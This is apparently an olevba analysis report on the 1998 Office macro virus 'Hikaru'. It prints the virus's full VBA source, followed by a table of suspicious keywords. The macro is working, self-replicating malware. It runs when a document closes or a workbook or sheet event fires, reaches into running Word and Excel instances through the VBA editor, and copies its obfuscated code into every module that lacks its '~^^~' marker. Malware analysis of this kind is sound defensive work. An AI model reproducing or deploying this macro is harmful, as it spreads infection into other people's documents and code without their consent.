olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hikaru-6e3be4620977d8c85c94dc7db35afe27690f97cf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Hikaru-6e3be4620977d8c85c94dc7db35afe27690f97cf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Copyright (C) 1998 by FlyShadow ~^^~ - Hikaru
Dim Јf As String, Јh As Byte
Private Sub Document_Close()
 On Error Resume Next
 Јl Application.VBE: Јh = 1
 Јl GetObject(, "Word.Application").VBE
 Јl GetObject(, "Excel.Application").VBE
End Sub
Private Sub Јl(ByRef Јj As Object)
 For Јd = 1 To Јj.CodePanes.Count
 Set Јo = Јj.CodePanes(Јd).CodeModule
    If Јo.Find("~^^~", 0, 0, 0, 0) And Јh = 0 Then
        Јf = Јo.Lines(1, Јo.CountOfLines): Јh = 1: Јd = 0
    End If
    If Not Јo.Find("~^^~", 0, 0, 0, 0) And Јh = 1 Then
        Јj.CodePanes(Јd).CodeModule.InsertLines 1, Јf
    End If
 Next
End Sub
Private Sub Workbook_Deactivate(): Document_Close: End Sub
Private Sub UserForm_Initialize(): Document_Close: End Sub
Private Sub Worksheet_Activate(): Document_Close: End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

